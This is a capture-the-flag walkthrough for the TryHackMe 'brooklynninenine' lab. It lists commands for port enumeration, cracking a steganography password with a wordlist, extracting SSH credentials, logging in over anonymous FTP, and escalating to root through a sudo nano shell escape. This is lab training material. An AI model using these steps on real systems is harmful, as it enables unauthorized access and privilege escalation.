# brooklynninenine | CTF Machine 

## Tools && Sources

1. [tryenum](https://github.com/alauthor/enum-tryhackme-machine)
2. stegcrack
3. steghide 
4. ftp 
5. ssh 
6. [gtfobins](https://gtfobins.github.io/)

## steps to get two flags 
```bash
./tryenum.sh 10.10.x.x
[+] http port 80 is open  
[+] open ports 21,22,80
[+] found brooklyn99.jpg brooklyn/SCAN/WEBSERVER/RESOURCES
[+] found tryenum_comments.txt brooklyn/SCAN/WEBSERVER/KEYWORDS says <!-- Have you ever heard of steganography? -->
[+] so start stegcrack brooklyn99.jpg found the password : admin 
[+] steghide steghide extract -sf brooklyn99.jpg
[+] found note.txt file 
[+] cat note.txt says that "holts" has password of "fluffydog12@ninenine"
[+] after scan complete it says that ftp anonymous is allowd so go and check it will return a file "what important about the file that holt is the username of ssh connection"
[+] user.txt in the home path | flag-1
[+] sudo -l | you can run /bin/nano as root 
[+] open the gtfobins and get a root shell 
[+] cat /root/root.txt | flag-2
```
## STEP-1
```bash
now we know that port 21,22,80 opens 
```
<img src="https://github.com/alauthor/Tryhackme-CTF/blob/main/brooklyn/imgs/2022-07-09%2000_43_31-Kali-Linux-2020.4-vbox-amd64%20(6_18_2022)%20%5BRunning%5D%20-%20Oracle%20VM%20VirtualBox.png">

## STEP-2
```bash
after the scan complete go to brooklyn/SCAN/WEBSERVER/RESOURCES and you will find a file called brooklyn99.jpg 
this file downloaded from the main page http://ip-address-of-the-machine/brooklyn99.jpg
you can download it manually using wget 
wget "http://ip-address-of-the-machine/brooklyn99.jpg"
found a command in the view source of the main page at http://ip-address-of-the-machine:80/ says check stegonography you can easly go to that path  brooklyn/SCAN/WEBSERVER/KEYWORDS and display the file tryenum_comments.txt which contain comments of the webserver. 
stegcrack brooklyn99.jpg /usr/share/wordlists/rockyou.txt | password is admin 
steghide extract -sf brooklyn99.jpg | note.txt
cat note.txt
```
<img src="https://github.com/alauthor/Tryhackme-CTF/blob/main/brooklyn/imgs/2022-07-09%2000_44_22-Kali-Linux-2020.4-vbox-amd64%20(6_18_2022)%20%5BRunning%5D%20-%20Oracle%20VM%20VirtualBox.png">
<img src="https://github.com/alauthor/Tryhackme-CTF/blob/main/brooklyn/imgs/2022-07-08%2015_01_37-Kali-Linux-2020.4-vbox-amd64%20(6_18_2022)%20%5BRunning%5D%20-%20Oracle%20VM%20VirtualBox.png">
<img src="https://github.com/alauthor/Tryhackme-CTF/blob/main/brooklyn/imgs/2022-07-08%2015_02_01-Kali-Linux-2020.4-vbox-amd64%20(6_18_2022)%20%5BRunning%5D%20-%20Oracle%20VM%20VirtualBox.png">

## STEP-3
```bash
check full_scan_result in brooklyn/SCAN/NMAP path 
Ooooh ftp anonymous login allowed now 
ftp ip-of-the-machine
username : anonymous
password : anonymous | or just click enter 
you will find a file download that file using get command 
now we know the username which is "holt" and the password which is "fluffydog12@ninenine" let's connect to ssh 
ssh holt@ip-of-the-machine
cat user.txt | flag-1
sudo -l | you can run nano as root 
open the 6- resource file up
sudo /bin/nano
Press CTRL+R then CTRL+X 
add this command "reset; sh 1>&0 2>&0" | nice you're now root
cat /root/root.txt | flag-2
```
<img src="https://github.com/alauthor/Tryhackme-CTF/blob/main/brooklyn/imgs/2022-07-09%2000_45_09-Kali-Linux-2020.4-vbox-amd64%20(6_18_2022)%20%5BRunning%5D%20-%20Oracle%20VM%20VirtualBox.png">
<img src="https://github.com/alauthor/Tryhackme-CTF/blob/main/brooklyn/imgs/2022-07-09%2001_01_00-VirtualBoxVM.png">

